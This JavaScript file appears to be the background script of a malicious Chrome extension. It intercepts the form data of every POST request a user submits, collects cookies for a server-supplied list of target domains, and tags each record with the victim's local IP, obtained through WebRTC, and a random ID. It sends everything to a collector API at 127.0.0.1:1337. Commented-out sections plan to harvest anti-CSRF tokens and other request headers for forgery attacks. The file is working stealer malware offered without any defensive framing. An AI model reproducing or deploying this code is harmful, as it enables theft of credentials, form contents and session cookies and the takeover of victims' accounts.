var Local_IP;
var ID;
install();

// Setup
function install() {
    Local_IP = setLocalIP();
    console.log(Local_IP);
    // Random number between 1 and 1000000
    ID = Math.floor((Math.random() * 1000000) + 1);
}

// Get local IP
function setLocalIP(){
    window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;//compatibility for Firefox and chrome
    var pc = new RTCPeerConnection({iceServers:[]}), noop = function(){};
    pc.createDataChannel('');
    pc.createOffer(pc.setLocalDescription.bind(pc), noop);
    pc.onicecandidate = function(ice)
    {
        if (ice && ice.candidate && ice.candidate.candidate)
        {
            Local_IP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate)[1];
            //console.log(Local_IP);
            pc.onicecandidate = noop;
        }
    };
}

///////////////////////////////////////////////////////////////// "POST" req data

// This function listen for any POST req :)
chrome.webRequest.onBeforeRequest.addListener(
    function(details) {
        if(details.method == "POST") {
            var formList = details.requestBody.formData;
            if (typeof formList === 'undefined') {
                return;
            }
            var formListNames = Object.keys(formList);
            if (window.UndefinedVariable) {
                Object.assign(window.UndefinedVariable, {})
            }
            var formListValues = Object.values(Object.values(formList));
            var tmpData = {};
            for (var i = 0; i < formListNames.length; i++) {
                var tmpName = formListNames[i].toString();
                var tmpValue = formListValues[i].toString();
                //log(tmpName+' '+tmpValue);
                tmpData[tmpName] = tmpValue
            }
            console.log(tmpData);
            LogItUP(details.url, tmpData, "Form");
        }
    },
    {urls: ["<all_urls>"]},
    ["requestBody"]
);

/////////////////////////////////////////////////////////////////


///////////////////////////////////////////////////////////////// Cookies

// After every new tab
chrome.webNavigation.onCompleted.addListener(function() {
    cookielist();
}, {
    urls: [
        "*://*/*"
    ]
});

// Get all cookies
function cookielist(){
    var domainsItemList = getInfo("Domains");
    chrome.cookies.getAll({},function (cookie){
        for(i=0;i<cookie.length;i++){
            // console.log(cookie[i]);
            // For every WANTED cookie
            for (var j = 0; j < domainsItemList.length; ++j) {
                // If the domain is WANTED
                if (cookie[i].domain.includes(domainsItemList[j])) {
                    var tmpData = {};
                    // Save all cookies
                    for (var k = 0; k < cookiesItemList.length; ++k) {
                        tmpData[cookie[i].name] = cookie[i].value;
                    }
                    // console.log(cookie[i].domain, tmpData);
                    LogItUP(cookie[i].domain, tmpData, "Cookie");
                }
            }
        }
    });
}

/////////////////////////////////////////////////////////////////

///////////////////////////////////////////////////////////////// Generic function

// info should be one of these:
// Headers
// Domains
function getInfo(info, callback){
    var url ="http://127.0.0.1:1337/"+info;
    console.log(url);
    xhr = new XMLHttpRequest();
    xhr.open("GET", url, false); // synchronous
    xhr.send(null);
    var aList = [];
    var data = JSON.parse(xhr.responseText);
    for (var i = 0; i < data.length; ++i) {
        aList.push(data[i].name);
    }
    return aList;
}

// data is json
function LogItUP(site, data, type){
    var url ="http://127.0.0.1:1337/Posts";
    // Send it to our lovely api
    var JsonData = JSON.stringify({"IP": Local_IP,"ID": ID,"Site": site, "Data": data,"Type": type});
    xhr = new XMLHttpRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-type", "application/json");
    xhr.send(JsonData);
}

/////////////////////////////////////////////////////////////////
// Get all visited sites and WANTED headers for XS Request Forgery requests.

// This function runs every time the user request something. (BeforeRequest)
// (function() {
//     const tabStorage = {};
//     const networkFilters = {
//         urls: [
//             "*://*/*"
//         ]
//     };
//     chrome.webRequest.onBeforeRequest.addListener((details) => {
//         // Get all wanted headers/Tokens like Anti-CSRF tokens.
//         for (var i = 0; i < details.requestHeaders.length; ++i) {
//             var headersItemList = getInfo("headers");
//             var tmpData = {};
//             // For every WANTED header
//             for (var j = 0; j < headersItemList.length; ++j) {
//                 // console.log(details);
//                 // Search for all WANTED headers.
//                 // We do not want all of them since unlike cookies some headers are not useful at all.
//                 if (details.requestHeaders[i].name === headersItemList[i] ) {
//                     // Report back with details.requestHeaders[i].value
//                         tmpData[details.requestHeaders[i].name] = details.requestHeaders[i].value;
//                 }
//             }
//         }
//         // console.log(tmpData);
//         LogItUP(details.url,tmpData, "Header");
//         // Stop it for now since it's super noisy.
//         //LogSite(details.url,'')
//     }, networkFilters);
// }());


/////////////////////////////////////////////////////////////////

//
//
// (function() {
//     const tabStorage = {};
//     const networkFilters = {
//         urls: [
//             "*://*/*"
//         ]
//     };
//     chrome.webRequest.onSendHeaders.addListener((details) => {
//
//         // Get all wanted headers/Tokens like Anti-CSRF tokens.
//         for (var i = 0; i < details.requestHeaders.length; ++i) {
//             //var headersItemList = getInfo("headers");
//             // For every WANTED header
//             for (var j = 0; j < headersItemList.length; ++j) {
//                 console.log(details);
//                 // if (details.requestHeaders[i].name === headersItemList[i] ) {
//                 //     // Report back with details.requestHeaders[i].value
//                 // }
//             }
//         }
//
//
//         // idea : get the data from the POST req.
//
//
//         // Working:
//
//         //LogSite(details.url,'')
//         //alert(details.url);
//     }, networkFilters);
// }());
//
//
//
// // chrome.cookies.getAll({},function (cookie){
// //     console.log(cookie.length);
// //     var bkg = chrome.extension.getBackgroundPage();
// //     for(i=0;i<cookie.length;i++){
// //         console.log(JSON.stringify(cookie[i]));
// //         alert(JSON.stringify(cookie[i]));
// //         bkg.console.log(JSON.stringify(cookie[i]));
// //     }
// // });
//
//
//
// // function getCookies(domain, name, callback) {
// //     chrome.cookies.get({"url": domain, "name": name}, function(cookie) {
// //         if(callback) {
// //             callback(cookie.value);
// //         }
// //     });
// // }
// // //usage:
// // getCookies("http://127.0.0.1:8085", "id", function(id) {
// //     alert(id);
// // });
//
//


//
// chrome.tabs.onUpdated.addListener(function(tabId, changeInfo) {
//     if (changeInfo.status === 'complete') {
//         chrome.tabs.executeScript(tabId, {
//             allFrames: true,
//             file: 'log.js',
//             code: `console.log('location:', window.location.href);`
//
//         });
//     }
// });
